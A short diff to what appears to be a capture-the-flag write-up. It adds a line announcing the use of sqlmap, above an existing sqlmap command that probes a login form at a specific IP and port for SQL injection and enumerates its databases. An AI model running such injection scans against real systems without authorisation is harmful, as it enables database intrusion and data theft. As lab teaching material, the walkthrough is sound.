@@ -69,6 +69,10 @@ Okay.. that tells us that `username` and `password` are the variables being
 passed to the server.
 
 ### SQLMAP - DISCOVERY
+
+Let's use sql map to see if we can use an SQL injection exploit to discover
+more about our target..
+
 ```
 $ sqlmap -u http://88.198.233.174:35067 --method POST --data="username=blah&password=blah" --dbs --batch --tamper=space2comment --level 5 --risk 3
 ```
